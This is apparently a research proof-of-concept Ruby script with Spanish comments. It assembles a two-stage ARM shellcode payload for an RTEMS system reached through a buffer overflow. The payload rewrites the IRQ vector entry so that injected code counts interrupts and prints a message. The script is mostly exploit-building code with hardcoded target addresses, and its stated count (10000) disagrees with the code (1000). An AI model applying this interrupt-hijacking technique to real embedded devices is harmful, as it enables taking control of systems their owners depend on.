=begin

Este payload se separa en dos etapas, la primera modifica el handler el IRQ y lo apunta
a una dirección de memoria donde espera que se envie la segunda etapa donde lo copia, esta
segunda etapa simplemente maneja un contador que al llegar a 10000 interrupciones escribe
un mensaje. Este ejemplo puede fallar porque no es lo ideal llamar a un puts en medio
de una interrupción.

=end


require '../src/ruby/MyCustomPayload'

# Datos que quedan hardcodeados y deben ser sabidos de antemano.
normalReturnAddress = 0x8520
safeMemoryAddress = 0x50000 # (bss section)
overflowBufAddress = 0x103c48

# Direcciones del IRQ, también deben saberse.
# 00008038 <handler_addr_irq>:
#     8038:	000133a0 	.word	0x000133a0
rtemsIrqHandlerAddress = 0x133a0
rtemsIrqHandlerAdresssAdress = 0x0038

# Solo por practicidad de este POC también se hardcodean las funciones que utiliza el stage-0
# (readBytes y pthread_create) aunque se podría agregar la lógica para que este stage resuelva estas dos direcciones solo.
pthread_create_address = 0xe244
readBytes_address = 0x83d0
puts_address = 0x16ef4

# TODO: Estos valores deben ajustarse cada vez que se modifican los payloads.
stage0Size = 32
stage1Size = 44

nextSafeAddress = safeMemoryAddress # (puntero que va a avanzando sobre la memoria "segura" utilizada)

# Se calcula el espacio que va a usar el array con las funciones
$functionsAddressArray = nextSafeAddress
nextSafeAddress += $fingerprints.length * 4

# STAGE-1
$stage1 = MyCustomPayload.new(stage1Size)
$stage1.address = nextSafeAddress
nextSafeAddress += stage1Size

stage1Start = $stage1.currPC

irqCounterAddress = $stage1.addData([0] * 4)
$stage1.mov32bToReg(R1, irqCounterAddress)
# LDR R0, [R1]
$stage1.addInst genLoadStoreImmediate(R0, R1, 0, 1, 1, 0, 0, 1)
# R0 += 1
$stage1.addInst genDataProc32bitImm(R0, R0, 1, OP_ADD, updateFlags = false, cond = COND_AL)
# R2 = 1000
$stage1.mov32bToReg(R2, 1000)
# CMP R0, R2
$stage1.addInst genCmpReg(R0, R2)
# MOVEQ R0, 0
$stage1.addInst genDataProc32bitImm(R0, 0, 0, OP_MOV, updateFlags = false, cond = COND_EQ)
# STR R0, [R0]
$stage1.addInst genLoadStoreImmediate(R0, R1, 0, 1, 1, 0, 0, 0)
# LDR R0, "Interrupcion."
$stage1.loadStrAddress(R0, "Interrupcion.")
# BEQ puts
$stage1.addInst genBranch($stage1.currPC, puts_address, COND_EQ, linkBranch = true)

$stage1.mov32bToReg(R0, rtemsIrqHandlerAddress)
$stage1.addInst genBranchToReg(R0)



# STAGE 0: Se resuelve una vez tenga definido el stage 1
$stage0 = MyCustomPayload.new(stage0Size)
$stage0.address = overflowBufAddress

$stage0.saveAllRegisters

# Llamo a readBytes para copiar un futuro stage-1 payload a una zona segura de memoria (ej: bss)
$stage0.mov32bToReg(R0, $stage1.address)
$stage0.bl(readBytes_address)

# Reescribo la entrada de la EVT para IRQ
$stage0.mov32bToReg(R0, stage1Start)
$stage0.mov32bToReg(R1, rtemsIrqHandlerAdresssAdress)
# STR R0, [R1] => STR stage1Start, [rtemsIrqHandlerAdresssAdress]
$stage0.addInst genLoadStoreImmediate(R0, R1, 0, 1, 1, 0, 0, 0)

$stage0.restoreAllRegisters

$stage0.addInst genBranchToReg(LR_REG) # Porque por ahora llamo al payload con un BLX
# $stage0.addInst genBranch($stage0.currPC, $stage0.fnAddr['payloadRet'], condition = COND_AL, linkBranch = false)
